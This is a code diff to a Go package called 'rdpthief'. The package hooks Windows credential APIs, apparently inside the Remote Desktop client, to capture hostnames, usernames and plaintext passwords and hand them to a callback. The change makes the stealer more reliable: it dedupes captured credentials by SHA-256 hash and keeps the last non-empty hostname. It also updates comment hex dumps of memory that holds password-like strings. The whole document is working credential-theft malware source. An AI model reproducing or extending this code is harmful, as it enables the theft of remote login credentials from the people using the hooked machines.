@@ -3,6 +3,7 @@
 package rdpthief
 
 import (
+	"crypto/sha256"
 	"reflect"
 	"runtime"
 	"sync"
@@ -32,6 +33,9 @@ type Hook struct {
 
 	hostname string
 	password string
+
+	// prevent record the same credential
+	lastCredHash [sha256.Size]byte
 
 	mu sync.Mutex
 }
@@ -109,7 +113,10 @@ func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr
 		)
 	}()
 
-	h.hostname = windows.UTF16PtrToString(targetName)
+	hostname := windows.UTF16PtrToString(targetName)
+	if hostname != "" {
+		h.hostname = hostname
+	}
 	return
 }
 
@@ -127,18 +134,17 @@ func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) (ret uintptr)
 	}()
 
 	// skip data that not contain password
-	// 0000  02 00 00 00 4d 00 00 00 00 00 00 00 fc 7f 00 00  ....M...........
-	// 0010  40 00 00 00 00 00 00 00 0a 00 0a 00 28 00 55 00  @...........(.U.
-	// 0020  40 00 00 00 00 00 00 00 72 00 72 00 6e 00 74 00  @.......r.r.n.t.
-	// 0030  4a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  J...............
-	// 0040  74 00 65 00 73 00 74 00 24 00 40 00 40 00 44 00  t.e.s.t.$.@.@.D.
-	// 0050  07 00 08 00 0c 00 0a 00 0d 00 67 00 41 00 41 00  ..........g.A.A.
-	// 0060  41 00 41 00 41 00 2d 00 4f 00 42 00 42 00 41 00  A.A.A.-.O.B.B.A.
-	// 0070  41 00 41 00 41 00 41 00 41 00 51 00 69 00 76 00  A.A.A.A.A.Q.i.v.
-	// 0080  48 00 42 00 48 00 46 00 6f 00 71 00 44 00 59 00  H.B.H.F.o.q.D.Y.
-	// 0090  7a 00 54 00 43 00 51 00 36 00 23 00 6c 00 64 00  z.T.C.Q.6.#.l.d.
-	// 00a0  6d 00 4e 00 69 00 57 00 69 00 58 00 6a 00 64 00  m.N.i.W.i.X.j.d.
-	// 00b0  75 00 72 00 61 00 44 00 4f 00 47 00 00 00 00 00  u.r.a.D.O.G.....
+	// 0000  02 00 00 00 fc 7f 00 00 00 00 00 00 00 00 00 00  ................
+	// 0010  40 00 00 00 00 00 00 00 06 00 06 00 f7 01 00 00  @...............
+	// 0020  40 00 00 00 00 00 00 00 5c 00 5c 00 00 00 00 00  @.......\.\.....
+	// 0030  46 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  F...............
+	// 0040  61 00 63 00 67 00 40 00 40 00 44 00 07 00 08 00  a.c.g.@.@.D.....
+	// 0050  0c 00 0a 00 0d 00 59 00 41 00 41 00 41 00 41 00  ......Y.A.A.A.A.
+	// 0060  41 00 2d 00 4f 00 42 00 42 00 41 00 41 00 41 00  A.-.O.B.B.A.A.A.
+	// 0070  41 00 41 00 41 00 41 00 4a 00 77 00 77 00 31 00  A.A.A.A.J.w.w.1.
+	// 0080  53 00 56 00 41 00 59 00 45 00 32 00 71 00 6d 00  S.V.A.Y.E.2.q.m.
+	// 0090  2d 00 62 00 62 00 34 00 42 00 46 00 36 00 59 00  -.b.b.4.B.F.6.Y.
+	// 00a0  75 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  u...............
 	if *address == 2 && size != 16 {
 		return
 	}
@@ -195,13 +201,19 @@ func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) (ret uint
 	}()
 
 	username := windows.UTF16PtrToString(marshaledCredential)
-	if username != "" && h.password != "" {
+	if username == "" || h.password == "" {
+		return
+	}
+	// compare with the last credential
+	hash := sha256.Sum256([]byte(h.hostname + username + h.password))
+	if hash != h.lastCredHash {
 		h.callback(&Credential{
 			Hostname: h.hostname,
 			Username: username,
 			Password: h.password,
 		})
-		h.password = ""
+		h.lastCredHash = hash
 	}
+	h.password = ""
 	return
 }
